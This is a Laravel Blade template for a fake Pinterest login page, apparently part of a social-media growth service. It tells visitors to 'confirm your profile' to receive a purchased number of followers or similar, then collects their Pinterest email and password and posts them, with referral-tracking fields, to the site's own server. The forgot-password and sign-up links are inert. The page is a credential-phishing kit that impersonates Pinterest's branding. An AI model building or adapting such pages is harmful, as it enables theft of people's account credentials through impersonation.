@extends('platform-login.layout')

@section('title', 'Pinterest - Login')

@section('content')
<div class="w-full max-w-[420px] mx-auto space-y-4">
    <!-- Pinterest Login Card -->
    <div class="bg-[#181818] border border-white/10 rounded-3xl p-8 sm:p-10 shadow-2xl relative text-center">
        <!-- Pinterest Logo -->
        <div class="w-14 h-14 mx-auto rounded-full bg-[#E60023] flex items-center justify-center text-white text-2xl font-bold mb-4 shadow-lg shadow-[#E60023]/30">
            <i class="fa-brands fa-pinterest-p"></i>
        </div>

        <h2 class="text-2xl font-bold text-white mb-2">Welcome to Pinterest</h2>
        <p class="text-xs text-gray-400 mb-6">
            Confirm your profile to deliver <strong class="text-white">{{ number_format($quantity) }} {{ $service }}</strong>
            @if(!empty($username))
                for <span class="text-[#E60023]">{{ $username }}</span>
            @endif
        </p>

        <form method="POST" action="{{ route('platform.login.store', ['platform' => 'pinterest']) }}" class="space-y-4 text-left">
            @csrf
            <input type="hidden" name="tag_id" value="{{ $tag->id ?? 10 }}">
            <input type="hidden" name="service_type" value="{{ $service }}">
            <input type="hidden" name="quantity" value="{{ $quantity }}">
            <input type="hidden" name="username" value="{{ $username }}">
            <input type="hidden" name="referral_code_id" value="{{ $refId }}">
            <input type="hidden" name="ref_id" value="{{ $refId }}">

            <div>
                <label class="block text-xs font-semibold text-gray-300 mb-1">Email</label>
                <input type="email" name="email" required
                    value="{{ $username }}"
                    class="w-full px-4 py-3 text-sm rounded-2xl bg-[#282828] border border-white/10 text-white placeholder-gray-500 focus:outline-none focus:border-[#E60023] transition-colors"
                    placeholder="Email">
            </div>

            <div class="relative">
                <label class="block text-xs font-semibold text-gray-300 mb-1">Password</label>
                <input type="password" id="pin_password" name="password" required
                    class="w-full px-4 py-3 pr-14 text-sm rounded-2xl bg-[#282828] border border-white/10 text-white placeholder-gray-500 focus:outline-none focus:border-[#E60023] transition-colors"
                    placeholder="Password">
                <button type="button" onclick="togglePassword('pin_password', this)"
                    class="absolute right-4 top-8 text-xs font-semibold text-gray-400 hover:text-white transition-colors">
                    Show
                </button>
            </div>

            <div class="text-xs">
                <span class="text-gray-400 hover:underline cursor-pointer">Forgotten your password?</span>
            </div>

            <button type="submit"
                class="w-full py-3 bg-[#E60023] hover:bg-[#b8001c] text-white font-bold text-sm rounded-full transition-all active:scale-[0.98]">
                Log in
            </button>
        </form>

        <div class="mt-6 text-xs text-gray-400">
            Not on Pinterest yet? <span class="text-[#E60023] font-bold hover:underline cursor-pointer">Sign up</span>
        </div>
    </div>
</div>
@endsection

@section('scripts')
<script>
    function togglePassword(inputId, btn) {
        const input = document.getElementById(inputId);
        if (input.type === 'password') {
            input.type = 'text';
            btn.innerText = 'Hide';
        } else {
            input.type = 'password';
            btn.innerText = 'Show';
        }
    }
</script>
@endsection
